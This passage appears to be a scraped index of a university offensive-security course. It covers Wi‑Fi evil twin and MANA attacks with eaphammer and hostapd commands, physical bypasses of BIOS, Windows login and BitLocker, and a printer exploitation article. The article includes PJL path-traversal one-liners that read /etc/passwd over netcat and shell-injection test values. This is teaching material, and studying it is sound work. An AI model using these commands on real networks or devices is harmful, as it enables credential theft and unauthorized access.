what their capabilities are. Probe requests come in two forms: directed and broadcast. Directed probe requests are addressed to a specific ESSID, and are the client\u2019s way of checking if a specific network is nearby. Clients that use directed probing will send out probe requests for each network in its PNL. It should be noted that directed probing is the only way of identify the presence of nearby hidden networks. Broadcast probe requests work almost exactly the same way, but are sent with the SSID field set to NULL. This addresses the broadcast probe to all nearby access points, allowing the the station to check if any of its preferred networks are nearby without revealing the contents of its PNL","title":"Active Probing"},{"location":"CS315/Week%207/#simple-ap-with-redirection-to-internet","text":"Before explaining how to perform more complex attacks it's going to be explained how to just create an AP and redirect it's traffic to an interface connected to the Internet . Using ifconfig -a check that the wlan interface to create the AP and the interface connected to the Internet are present.","title":"Simple AP with redirection to Internet"},{"location":"CS315/Week%207/#dhcp-dns","text":"apt-get install dnsmasq #Manages DHCP and DNS create a config file /etc/dnsmasq.conf as follows: interface=wlan0 dhcp-authoritative dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h dhcp-option=3,192.168.1.1 dhcp-option=6,192.168.1.1 server=8.8.8.8 log-queries log-dhcp listen-address=127.0.0.1 Then set IPs and routes : ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 And then start dnsmasq: dnsmasq -C dnsmasq.conf -d","title":"DHCP &amp; DNS"},{"location":"CS315/Week%207/#hostapd","text":"apt-get install hostapd Create a config file hostapd.conf: interface=wlan0 driver=nl80211 ssid=MITIWIFI hw_mode=g channel=11 macaddr_acl=0 ignore_broadcast_ssid=0 auth_algs=1 wpa=2 wpa_passphrase=mitmwifi123 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP wpa_group_rekey=86400 ieee80211n=1 wme_enabled=1 Stop annoying processes , set monitor mode , and start hostapd : airmon-ng check kill iwconfig wlan0 mode monitor ifconfig wlan0 up hostapd ./hostapd.conf","title":"hostapd"},{"location":"CS315/Week%207/#forwarding-and-redirection","text":"iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE iptables --append FORWARD --in-interface wlan0 -j ACCEPT echo 1 > /proc/sys/net/ipv4/ip_forward","title":"Forwarding and Redirection"},{"location":"CS315/Week%207/#evil-twin","text":"An evil twin attack is a type Wi-Fi attack that works by taking advantage of the fact that most computers and phones will only see the \"name\" or ESSID of a wireless network (as the base station is not required to authenticate against the client). This actually makes it very hard to distinguish between networks with the same name and same kind of encryption. In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users. Due how the implementation of clients work (remember that the 802.11 protocol allows stations to roam freely between access points within the same ESS), it is possible to make a device to change the base station it is connected to. It is possible to do that offering a better signal (which is not always possible) or by blocking the access to the original base station (deauthentication packets, jamming, or some other form of DoS attack). Notice also that real-world wireless deployments usually have more than a single access point, and these access points are often more powerful and have better line-of-site range due to their placement towards the ceiling. Deauthenticating a single access point usually results in the target roaming towards another valid access point rather than your rogue AP, unless all nearby access points are deauthenticated (loud) or you are very careful with the placement of the rogue AP (difficult). You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing: airbase-ng -a 00:09:5B:6F:64:1E --essid \"Elroy\" -c 1 wlan0mon You could also create an Evil Twin using eaphammer (notice that to create evil twins with eaphammer the interface should NOT be in monitor mode): ./eaphammer -i wlan0 --essid exampleCorp --captive-portal Or using Airgeddon: Options: 5,6,7,8,9 (inside Evil Twin attack menu). Please, notice that by default if an ESSID in the PNL is saved as WPA protected, the device won't connect automatically to an Open evil Twin. You can try to DoS the real AP and hope that the user will connect manually to your Open evil twin, or you could DoS the real AP an use a WPA Evil Twin to capture the handshake (using this method you won't be able to let the victim connect to you as you don't know the PSK, but you can capture the handshake and try to crack it). Some OS and AV will warn the user that connect to an Open network is dangerous...","title":"Evil Twin"},{"location":"CS315/Week%207/#wpawpa2-evil-twin","text":"You can create an Evil Twin using WPA/2 and if the devices have configured to connect to that SSID with WPA/2, they are going to try to connect. Anyway, to complete the 4-way-handshake you also need to know the password that the client is going to use. If you don't know it, the connection won't be completed . ./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase \"mywifipassword\"","title":"WPA/WPA2 Evil Twin"},{"location":"CS315/Week%207/#enterprise-evil-twin","text":"To understand this attacks I would recommend to read before the brief WPA Enterprise explanation .","title":"Enterprise Evil Twin"},{"location":"CS315/Week%207/#using-hostapd-wpe","text":"hostapd-wpe needs a configuration file to work. To automate the generation if these configurations you could use https://github.com/WJDigby/apd_launchpad (download the python file inside /etc/hostapd-wpe/ ) ./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com hostapd-wpe ./victim/victim.conf -s In the configuration file you can select a lot of different things like ssid, channel, user files, cret/key, dh parameters, wpa version and auth... Using hostapd-wpe with EAP-TLS to allow any certificate to login.","title":"Using hostapd-wpe"},{"location":"CS315/Week%207/#using-eaphammer","text":"# Generate Certificates./eaphammer --cert-wizard # Launch Attack./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds By default, EAPHammer purposes this authentication methods (notice GTC as the first one to try to obtain plaintext passwords and then the use of more robust auth methods): GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 This is the default methodology to avoid long connection times. However, you can also specify to server the authentication methods from weakest to strongest: --negotiate weakest Or you could also use: --negotiate gtc-downgrade to use highly efficient GTC downgrade implementation (plaintext passwords) --negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect). Find more info in the wiki","title":"Using EAPHammer"},{"location":"CS315/Week%207/#using-airgeddon","text":"Airgeddon can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to capture the user and the MD5 of the password . Later, the attacker can try to crack the password. Airggedon offers you the possibility of a continuous Evil Twin attack (noisy) or only create the Evil Attack until someone connects (smooth).","title":"Using Airgeddon"},{"location":"CS315/Week%207/#debugging-peap-and-eap-ttls-tls-tunnels-in-evil-twins-attacks","text":"This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS Inside the configuration of hostapd-wpe comment the line that contains dh_file* * (from dh_file=/etc/hostapd-wpe/certs/dh to #dh_file=/etc/hostapd-wpe/certs/dh ) This will make hostapd-wpe to exchange keys using RSA instead of DH, so you will be able to decrypt the traffic later knowing the servers private key**. Now start the Evil Twin using hostapd-wpe with that modified configuration as usual. Also, start wireshark in the interface which is performing the Evil Twin attack. Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit... Add a new entry and fill the form with this values: IP address = any -- Port = 0 -- Protocol = data -- Key File ( select your key file , to avoid problems select a key file without being password protected ). And look at the new \"Decrypted TLS\" tab :","title":"Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks"},{"location":"CS315/Week%207/#karma-mana-loud-mana-and-known-beacons-attack","text":"","title":"KARMA, MANA, Loud MANA and Known beacons attack"},{"location":"CS315/Week%207/#essid-and-mac-blackwhitelists","text":"The following table lists the different type of MFACLs (Management Frame Access Control Lists) available, as well their effects when used: # example EAPHammer MFACL file, wildcards can be used78:f0:97:fc:b5:369a:35:e1:01:4f:cf69:19:14:60:20:45ce:52:b8:*:*:* [--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting][--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting] # example ESSID-based MFACL fileapplesorangesgrapespears [--ssid-whitelist /path/to/mac/whitelist/file.txt][--ssid-blacklist /path/to/mac/blacklist/file.txt]","title":"ESSID and MAC black/whitelists"},{"location":"CS315/Week%207/#karma","text":"Karma attacks are a second form of rogue access point attack that exploits the network selection process used by stations. In a whitepaper written in 2005, Dino Dai Zovi and Shane Macaulay describe how an attacker can configure an access point to listen for directed probe requests and respond to all of them with matching directed probe responses. This causes the affected stations to automatically send an association request to the attacker\u2019s access point. The access point then replies with an association response, causing the affected stations to connect to the attacker.","title":"KARMA"},{"location":"CS315/Week%207/#mana","text":"According to Ian de Villiers and Dominic White, modern stations are designed to protect themselves against karma attacks by ignoring directed probe responses from access points that have not already responded to at least one broadcast probe request. This led to a significant drop in the number of stations that were vulnerable to karma attacks until 2015, when White and de Villiers developed a means of circumventing such protections. In White\u2019s and de Villiers\u2019 improved karma attack (MANA attack), directed probe responses are used to reconstruct the PNLs of nearby stations. When a broadcast probe request is received from a station, the attacker\u2019s access point responds with an arbitrary SSID from the station\u2019s PNL already being saw in a direct probe from that device. In resume, the MANA algorithm works like this: each time the access point receives a probe request, it first determines whether it\u2019s a broadcast or directed probe. If it\u2019s directed probe, the sender\u2019s MAC address is added to the hash table (if it\u2019s not there already) and the ESSID is added to that device\u2019s PNL. The AP then responds with a directed probe response. If it\u2019s a broadcast probe, the access point responds with probe responses for each of the networks in that device\u2019s PNL. MANA attack using eaphammer: ./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]","title":"MANA"},{"location":"CS315/Week%207/#loud-mana","text":"Notice that the standard MANA attack still does not allow us to attack devices that don\u2019t use directed probing at all. So if we also doesn't know previously any entry inside the device PNL, we need to figure out some other way to attack it. A possibility is what is called Loud MANA attack. This attack relies on the idea that client devices within close physical proximity to one another are likely to have at least some common entries in their PNLs. In resume, Loud MANA attack instead of responding to probe requests with each ESSID in a particular device\u2019s PNL, the rogue AP sends probe responses for every ESSID in every PNL across all devices that it has seen before. Relating this to set theory, we can say that the AP sends probe responses for each ESSID in the union of all PNLs of nearby devices. ./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]","title":"Loud MANA"},{"location":"CS315/Week%207/#known-beacon-attack","text":"There are still cases in which Loud MANA attack won\u2019t succeed. The Known Beacon attack is a way to \"Brute-Force\" ESSIDs to try to get the victim connect to the attacker. The attacker creates an AP that response to any ESSID and run some code sending beacons faking ESSIDs of each name inside a wordlist. Hopefully the victim will contains some of theses ESSID names inside its PNL and will try to connect to the fake AP. Eaphammer implemented this attack as a MANA attack where all the ESSIDs inside a list are charged (you could also combine this with --loud to create a Loud MANA + Known beacons attack): ./eaphammer -i wlan0 --mana [--loud] --known-beacons --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]","title":"Known Beacon attack"},{"location":"CS315/Week%207/#known-beacon-burst-attack","text":"As known beacons are loud. You can use a script inside Eaphammer project to just launch beacouns of every ESSID name inside a file very quickly. If you combines this script with a Eaphammer MANA attack, the clients will be able to connect to your AP. # transmit a burst of 5 forged beacon packets for each entry in list ./forge-beacons -i wlan1 \\ --bssid de:ad:be:ef:13:37 \\ --known-essids-file known-s.txt \\ --dst-addr 11:22:33:11:22:33 \\ --burst-count 5","title":"Known Beacon Burst attack"},{"location":"CS315/Week%207/#other-tools","text":"","title":"Other tools"},{"location":"CS315/Week%207/#wifite2","text":"This tool automates WPS/WEP/WPA-PSK attacks. It will automatically: Set the interface in monitor mode Scan for possible networks - And let you select the victim(s) If WEP - Launch WEP attacks If WPA-PSK If WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs. Try to capture the PMKID from the AP to crack it Try to deauthenticate clients of the AP to capture a handshake If PMKID or Handshake, try to bruteforce using top5000 passwords.","title":"Wifite2"},{"location":"CS315/Week%207/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%207/#4-pt-insecure-wpa","text":"WiFi standards update so quick. Some security problems, some new attack ideas, balabala... I just don't want to update my router. Seriously, who would hack my wireless network? flag format: flag{md5 of the WiFi password} capture.cap","title":"(4 pt) Insecure WPA"},{"location":"CS315/Week%207/#4-pt-s-traffic-sniff","text":"My \u305b\u3093\u3071\u3044 (seniority) invited me to play games in his house. The seniority treated me with delicious black tea. But his WiFi is too slow to play video games. So, I'm going to debug this wireless network. 114514.7z","title":"(4 pt) \u91ce\u7363\u5148\u8f29\uff08\u3084\u3058\u3085\u3046\u305b\u3093\u3071\u3044\uff09's traffic sniff"},{"location":"CS315/Week%207/#2-pt-wifi","text":"Wang uploaded a Godzilla Trojan to server upload-labs. The memory image, wifi traffic, and the server's traffic are saved. Wang used Trojan to run cat /flag , and you are given these files. Find the flag. chall.zip","title":"(2 pt) wifi"},{"location":"CS315/Week%208/","text":"Week8 MISC: Physical Attacks BIOS password The battery Most of the motherbords have a battery . If you remove it 30min the settings of the BIOS will be restarted (password included). Jumper CMOS Most of the motherboards have a jumper that can restart the settings. This jumper connects a central pin with another, if you connect thoses pins the motherbord will be reseted . Live Tools If you could run for example a Kali Linux from a Live CD/USB you could use tools like killCmos* * or CmosPWD* (this last one is included in Kali) you could try to recover the password of the BIOS *. Online BIOS password recovery Put the password of the BIOS 3 times wrong , then the BIOS will show an error messag e and it will be blocked. Visit the page https://bios-pw.org and introduce the error code shown by the BIOS and you could be lucky and get a valid password (the same search could show you different passwords and more than 1 could be valid ). UEFI To check the settings of the UEFI and perform some kind of attack you should try chipsec . Using this tool you could easily disable the Secure Boot: python chipsec_main.py -module exploits.secure.boot.pk RAM Cold boot The RAM memory is persistent from 1 to 2 minutes from the time the computer is powered off. If you apply cold (liquid nitrogen, for example) on the memory card you can extend this time up to 10 minutes . Then, you can do a memory dump (using tools like dd.exe, mdd.exe, Memoryze, win32dd.exe or DumpIt) to analyze the memory. You should analyze the memory using volatility . INCEPTION Inception is a physical memory manipulation and hacking tool exploiting PCI-based DMA. The tool can attack over FireWire , Thunderbolt , ExpressCard , PC Card and any other PCI/PCIe HW interfaces. Connect your computer to the victim computer over one of those interfaces and INCEPTION will try to patch the pyshical memory to give you access . If INCEPTION succeeds, any password introduced will be vaid. It doesn't work with Windows10. Live CD/USB Sticky Keys and more SETHC: sethc.exe is invoked when SHIFT is pressed 5 times UTILMAN: Utilman.exe is invoked by pressing WINDOWS+U OSK: osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard DISP: DisplaySwitch.exe is invoked by pressing WINDOWS+P These binaries are located inside C:\\Windows\\System32* *. You can change any of them for a copy of the binary cmd.exe (also in the same folder) and any time that you invoke any of those binaries a command prompt as SYSTEM** will appear. Modifying SAM You can use the tool chntpw* * to modify the SAM* file * of a mounted Windows filesystem. Then, you could change the password of the Administrator user, for example. This tool is available in KALI. chntpw -h chntpw -l <path_to_SAM> Inside a Linux system you could modify the /etc/shadow* * or /etc/passwd* file. * Kon-Boot Kon-Boot is one of the best tools around which can log you into Windows without knowing the password. It works by hooking into the system BIOS and temporarily changing the contents of the Windows kernel while booting (new versions work also with UEFI ). It then allows you to enter anything as the password during login. The next time you start the computer without Kon-Boot, the original password will be back, the temporary changes will be discarded and the system will behave as if nothing has happened. Read More: https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/ It is a live CD/USB that can patch the memory so you won't need to know the password to login . Kon-Boot also performs the StickyKeys trick so you could press Shift* * 5 times to get an Administrator cmd**. Running Windows Initial shortcuts Booting shortcuts supr - BIOS f8 - Recovery mode supr - BIOS ini f8 - Recovery mode Shitf (after the windows banner) - Go to login page instead of autologon (avoid autologon) BAD USBs Rubber Ducky tutorials Tutorial 1 Tutorial 2 Teensyduino Payloads and tutorials There are also tons of tutorials about how to create your own bad USB . Volume Shadow Copy With administrators privileges and powershell you could make a copy of the SAM file. See this code . Bypassing Bitlocker Bitlocker uses 2 passwords . The one used by the user , and the recovery password (48 digits). If you are lucky and inside the current session of Windows exists the file C:\\Windows\\MEMORY.DMP* * (It is a memory dump) you could try to search inside of it the recovery password . You can get this file and a copy of the filesytem and then use Elcomsoft Forensic Disk Dercyptor to get the content (this will only work if the password is inside the memory dump). You coud also force the memory dump * using NotMyFault* of Sysinternals, but this will reboot the system and has to be executed as Administrator. You could also try a bruteforce attack using *Passware Kit Forensic* . An Introduction to Printer Exploitation Preface Note: As always the following is just a digest of all the things I could observe by working on printers myself or facts from stuff I read about recently. Since this thread about the HP printer promo videos 3 caught some attention I will try to shed some light onto the field which was displayed there. First of all we should keep in mind this was a promo video made by a company. So always ask yourself this: \u201cHow real are the displayed scenarios, or are these just \u2018Hollywood fabrications\u2019?\u201d I had some access to different printers over the last couple of month and learned some basic principles, which I wanna share with you as good as possible now. Printer use a various amount of protocols and firmwares which differ from vendor to vendor and model to model. So this first part might be boring to some, you can try to skip the theoretical part and jump right to the exploitation paragraph, but talking about fundamentals will cover important topics. Printer as an attack vector? So why would I even want to target a printer in the first place? Why not just target Desktop or Server environments with malware as usual? We get to that in next couple of paragraphs Required Skills Not much to mention here basic ability to read for more than 5 minutes Printer a viable target or just wasted time? Local vs Network printers Local printers are just directly connected to a desktop PC and are rather uninteresting. These days almost all printers seem to be network printers though. So basically network printing enables users in locations geographically separate from each other and from their print devices to produce documents for themselves and others. Print servers enable multiple clients to share one or more print devices. So far so easy right? Let\u2019s jump directly to some highlevel view which explains every network printer quite well. Highlevel view A highlevel view of current network printers might look something like this: +----------------------------------------------------+ | Network printing protocols | Printing channel +-------------------------------+--+ | | | IPP, LPD, SMB, raw port 9100 | | | +--------------------------------------------------+ | | job/printer control langs. | | Printer language +-----------------------------+--+ | | | | | PJL, PML | | | | | | +------------------------+ | | | | Page descr. langs. | | | | +------------------------+---+ | | | | | | | | | PS, PCL, PDF, XPS, ... | | | | | | | | | +----------------------------+ | | +--------------------------------+ | +----------------------------------+ Note: This diagram might be incomplete! =The network printing protocol acts as a channel to deploy print jobs, which either contain the page description language directly or first invoke a printer/job control language! Let\u2019s take a look at each of those sections in the diagram above more closely and cover some fundamentals. Fundamentals Firmware Printer use, in my experience a couple of different operating systems for embedded devices. I\u2019ll list a few of them here, but won\u2019t really dive into them, since it would go beyond the scope of this article. Basic but slimmed down GNU/Linux, often custom tailored, WindRiver Linux 54 , VxWorks 38 , ThreadX 28 . With the different, but limited pool of printers I\u2019ve had access to all of them had some things in common in the end. slimmed down instruction/command set - reduced functionality, \u2018legacy kernels\u2019 - often around kernel version 2.6.XYZ, might include \u2018hidden\u2019 functionality, which can be enabled through a little patch - e.g.: ssh files are there, but need to be enabled in config files, ssh is more present in printers designed for offices, compared to home printers for some reason, sometimes the way the firmware is stored is hilarious - e.g.: on a SD card you can remove/switch within 30 seconds of physical access These facts show that printers might be vulnerable to certain attacks, but still these attacks often are made more \u2018complicated\u2019, because certain functions aren\u2019t even there or somehow have to get enabled through (remote) file system writes\u2026 Next a wild bunch of protocols is used for communication between Printers, print servers, desktop PCs and even internally within a printer. Let\u2019s take a look! Network printing protocols To summarize it right away there are a bunch of \u2018exotic\u2019 protocols for network printing (NCP or AppleTalk for example) To explain and mention them all here would be too much again. If anyone is interested in some specifics or a follow up post I\u2019d answer any questions there. In the Windows world, SMB/CIFS printer are popular. The most common printing protocols supported directly by network printers however are LPD, IPP, and raw port 9100 printing, which I will explain a bit more in depth now. Furthermore, some devices support printing over generic protocols such as FTP or HTTP file uploads as well. LPD LPD is short for \u2018Line Printer Daemon\u2019-protocol. It runs on port 515/TCP and can be accessed by using \u2018lpr\u2019 over the CLI. To print things, the client sends a control file defining job/username and a data file containing the actual data to be printed. IPP IPP is an extendable protocol and based on HTTP, so it inherits all existing security features like basic authentication and SSL/TLS encryption. To submit a print job, a HTTP POST request is sent to the IPP server, which listens on 631/TCP. For anyone wondering CUPS is an IPP implementation, which is a default printing system in many Linux distributions and macOS X. SMB SMB, short for \u2018Server Message Block\u2019 is an application-layer network protocol, which handles file and printer sharing. It\u2019s used by default on Windows. Usually it runs on 445/TCP. Port 9100 Also known as \u2018raw printing\u2019, since it makes use of connecting to 9100/TCP of a network printer. It is the default method used by CUPS and the Windows printing architecture. Here all data sent is directly processed by the printing device, just like a parallel connection over TCP. In contrast to LPD, IPP and SMB interpreted printer control/page description languages, this one here is capable of sending direct feedback to the client, including status and error messages. So we have a bidirectional channel here, which directly can give us access to results of the Printer control languages! Printer Control Languages Basically a job control language manages settings like output trays for the current job. It often just sits in between the printing protocol and the page description language. Printer control and management languages are designed to affect not only a single print job but the device as a whole. I\u2019m not too knowledgeable here but the two most basic ones are listed below. SNMP SNMP, short for \u2018Simple Network Management Protocol\u2019 listens on 161/UDP. Was designed to manage network components PJL PJL, short for \u2018Printer Job Language\u2019 is the kinda de-facto standard now Can be used to manipulate general settings, also with permanent changes. There are many dialects as vendors tend to support only a subset of the commands listed in the PJL reference and instead prefer to add proprietary ones. PJL is also used to set the file format of the actual print data to follow, which makes it interesting for various attacks. Page Description Languages (PDL) This one basically specifies how the actual document will look like appearance wise. Here comes the printer driver into play which kinda translate the file to be printed into a PDL that is understood by the printer. PostScript (PS) Is well known and made by Adobe and is widely used as a PDL. PS is capable of far more than just defining the appearance of the document and handling vector graphics though. That\u2019s why, when used correctly, PS can be used for a variety of attacks such as denial of service (for example, through infinite loops), print job manipulation and retention as well as gaining access to the printer\u2019s file system. PCL As a minimalist page description language supported by a wide variety of vendors and devices. Is also a de-facto Standard nowadays. It\u2019s also not intended to get direct access to the underlying filesystem. So it\u2019s not that well suited for exploitation purposes, but still has it\u2019s place for such purposes as well. Possible Exploits Who would put a printer on the Internet? I just leave this data as a first expression here shodan count port:9100 pjl 29111 [7/07/20 7:42:13] dev@ops shodan count port:515 lpd 50607 [7/07/20 7:42:46] dev@ops shodan count port:631 ipp 90760 [7/07/20 7:43:10] dev@ops shodan count port:161 snmp 7876 Data from: 07.07.2020 Attack Vectors Remote As easily seen above a lot of printers are connected to the Internet through port 9100, which make them attackable. You either know the IP or can just scan for some in your neighborhood radius/ check shodan. Once you have some you might get a SSH connection going. Often standard login credentials are still used, which you can easily scrape from the Internet\u2026 Inside job If you have physical access to the printer you can also plug in an USB drive or even a SD card. Possible Mayhem one can cause\u2026 So now we\u2019re kinda back to the linked topic at the beginning of the small web series directed by HP. So how realistic are the shown scenarios? DoS Transmission Channel - basically block the/one printing port to keep the printer busy and don\u2019t print anything anymore. Document processing - manipulate a Document via PDL and let the printer interpret it\u2026 e.g.: an infinite loop in PS. Physical damage - malware causing writes on NVRAM chips which have a life expectancy of ~10^5 writes 30 . Privilege Escalation Factory defaults - reset to factory defaults to bypass authentication. Accounting bypass - similar thing here, printing without authentication. Print Job Access Print job retention - Try to find stored print jobs on the printer and extract those. Print job manipulation - Alter print jobs. You can imagine the possible mayhem caused itself. Information Disclosure Memory access - may lead to finding sensitive data like passwords or printed documents. File system access - potentially retrieve sensitive information like configuration files or stored print jobs. Credential disclosure - brute force attacks against changed default login credentials to gain access Code Execution Buffer overflows - printers provide additional languages and network services, potentially prone to this kind of attack Firmware updates - it is common for printers to deploy firmware updates as ordinary print jobs cough malicious firmware cough Software packages - \u2018custom tailored and manipulated printer apps\u2019 Misc Malware - target network printers and spread it in local networks to other peers. possible scenarios Depending on the planned attack and possible access one has a variety of attack vectors. One need more planning than others. Some need physical access and some can be done from remote. Combinations of those are easily possible! For example issuing a malicious firmware update via a simple print job (possible case: no authentication needed), which extracts sensitive data and renders the printer useless. -Printer \u2018ransomware\u2019 may be a thing, even if it sounds kinda weird. So to conclude this section, I think the shown attacks in the videos were presented a tad to \u2018flashy\u2019, but are indeed possible depending on the printers and network they are placed in. Tools A lot of these techniques mentioned above need some serious work or knowledge about the underlying structure ( e.g.: used PDL, PCL). Even though these might be fairly easily found out using manuals or online search it\u2019s still a hassle and extra work. So people already made our lifes more easy by providing tools for almost all tasks mentioned above :). BeEF The Browser Exploitation Framework (BeEF) is a penetration testing tool that focuses on the web browser. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. This is not really printer specific, but it is a framework to implement cross-site printing 48 functionality. Praeda Praeda - \u201cAn Automated Printer Data Harvesting Tool\u201d written in perl. Also a tool to help pentesters to gather usable data during security assessment jobs. Praeda systematically collects sensitive information from the printer\u2019s embedded web server. This includes device passwords, usernames, email addresses which might be available publicly on the web interface. PRET 328 This one is real nifty tool written in python to check for basically every attack vector I mentioned above. It tries to connect to the printer via network or USB and tries to exploit the used printer languages, currently supported are PS, PJL and PCL. When successfully connected one has a ton of available commands. A full list can be found on the Github, linked below. LES Linux Exploit Suggester is a neat little perl script, which gives some options for possible exploits depending on your kernel. As stated above the kernel versions for embedded operating systems are often far lower, compared to current linux based desktop or server distributions. So old, usually fixed exploit techniques might still be viable here! Note: It is likely, that perl is not present in it\u2019s full range and copying it to a printer is extra work. Luckily one can run simply run in a desktop environment and specifying the kernel you want to exploit My home printer - a journey to find a way in! Ok what is a basic plan to concentrate on when trying to exploit a printer? I\u2019ve given a lot of theory until this point, as well as some \u201cDo\u2019s\u201d and \u201cMights\u201d. Maybe you\u2019ve got some ideas on your own already, but here\u2019s a little experimental journey from me. So first thing that is obvious is to check for open ports and an OS fingerprint. Luckily we have nmap. Nmap is bae for this. Where\u2019s the door? $ sudo nmap 192.168.1.108 Starting Nmap 7.01 ( https://nmap.org ) at 2017-09-11 20:13 CEST Nmap scan report for 192.168.1.108 Host is up (0.031s latency). Not shown: 993 closed ports PORT STATE SERVICE 80/tcp open http 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 515/tcp open printer 631/tcp open ipp 9100/tcp open jetdirect MAC Address: 44:D2:44:1C:73:E2 (Seiko Epson) Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds Device type: specialized Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.31 - 2.6.35 (embedded) Network Distance: 1 hop OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . $ So we have the usual printing ports open, as well as some other basic ones. It is running an older Linux as well, so no big surprise there! No open 22/TCP port though. So causing mayhem on the file system is not possible as of now. PRET and done? I\u2019ve praised PRET quite a bit above, so let\u2019s give it a try to check if my Epson printer has a nice, hopefully standard set of supported printer languages! $ python pret.py 192.168.1.108 -s PS Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PS support: not found $ $ python pret.py 192.168.1.108 -s Pjl Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PJL support: not found $ $ python pret.py 192.168.1.108 -s PCL Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PCL support: not found $ So no SSH and not even a standard version here\u2026 Most likely the result of my vendor using some exotic stuff again and not keeping things simple \u2026 Anyway using PRET is easy and self explanatory, once connected a help function will give you an overview of available stuff! From checking the file-system. creating directories, changing configuration files or even dumping the whole NVRAM. PRET can do it all (in theory that is ). After trying a few things to find a way to make PRET work for me I trashed that idea for now and moved on! LES So I wanted to have some fun now after the two disappointing results :D. So let\u2019s dig deeper into what Linux exploits might get suggested for our version! $ perl Linux_Exploit_Suggester.pl -k 2.6.31 Kernel local: 2.6.31 Searching among 65 exploits... Possible Exploits: [+] american-sign-language CVE-2010-4347 Source: http://www.securityfocus.com/bid/45408/ [+] can_bcm CVE-2010-2959 Source: http://www.exploit-db.com/exploits/14814/ [+] do_pages_move Alt: sieve CVE-2010-0415 Source: Spenders Enlightenment [+] half_nelson Alt: econet CVE-2010-3848 Source: http://www.exploit-db.com/exploits/6851 [+] half_nelson1 Alt: econet CVE-2010-3848 Source: http://www.exploit-db.com/exploits/17787/ [+] half_nelson2 Alt: econet CVE-2010-3850 Source: http://www.exploit-db.com/exploits/17787/ [+] half_nelson3 Alt: econet CVE-2010-4073 Source: http://www.exploit-db.com/exploits/17787/ [+] msr CVE-2013-0268 Source: http://www.exploit-db.com/exploits/27297/ [+] pipe.c_32bit CVE-2009-3547 Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c [+] pktcdvd CVE-2010-3437 Source: http://www.exploit-db.com/exploits/15150/ [+] ptrace_kmod2 Alt: ia32syscall,robert_you_suck CVE-2010-3301 Source: http://www.exploit-db.com/exploits/15023/ [+] rawmodePTY CVE-2014-0196 Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c [+] rds CVE-2010-3904 Source: http://www.exploit-db.com/exploits/15285/ [+] reiserfs CVE-2010-1146 Source: http://www.exploit-db.com/exploits/12130/ [+] video4linux CVE-2010-3081 Source: http://www.exploit-db.com/exploits/15024/ $ Note: If these are viable and meet all dependencies has to be checked of course, but a brief look at them made me decide not to spend too much effort here. Manual PJL Injection So I thought why not check for PJL again and try invoking some command strings manually in combination with netcat as a listener! So I tried using: echo \"@PJL FSUPLOAD FORMAT:BINARY NAME=\"../../etc/passwd\" OFFSET=0 SIZE=648\" | nc -v -v 192.168.1.108 9100 # If successful this should display the */etc/passwd* file. or echo \"@PJL INFO ID\" | nc -v -v 192.168.1.108 9100 # If successful this should get the *printer\u2019s device information* as well as other PJL command injecting techniques, but my printer is not accepting any of these. It\u2019s not reacting at all to this kind of \u2018attack\u2019\u2026 I\u2019m not knowledgeable enough to launch this with PS and PCL as well, because their command syntax differs greatly (obviously). I\u2019m remaining with a note to search for PS and PCL attack strings. A PRET test script to the rescue? So PRET doesn\u2019t work for my home printer as seen above. Interestingly I found that there is a script \u201chidden\u201d within the PRET source folder called \u201clpdtest.py\u201d It can test for known, but older (like really older) vulnerabilities within the Line Printer Daemon, listed here 60 . This involves some basic tests: \u2018get\u2019 Test Trying to get (aka print) a file from printer\u2019s file system. $ lpdtest.py printer get /etc/passwd $ lpdtest.py printer get \u2026/\u2026/\u2026/etc/passwd etc\u2026 \u2018in\u2019 Test This test is for fuzzing around with user input (hostname,username, jobname, filenames, etc.). This might be useful to test for interpretation of shell commands\u2026 # Test for environment variables $ lpdtest.py printer in '$UID' # Test for pipes and redirects $ lpdtest.py printer in '| pwd' $ lpdtest.py printer in '>/etc/passwd' # Test for backticks $ lpdtest.py printer in '`ls`' # Test for [shellshock 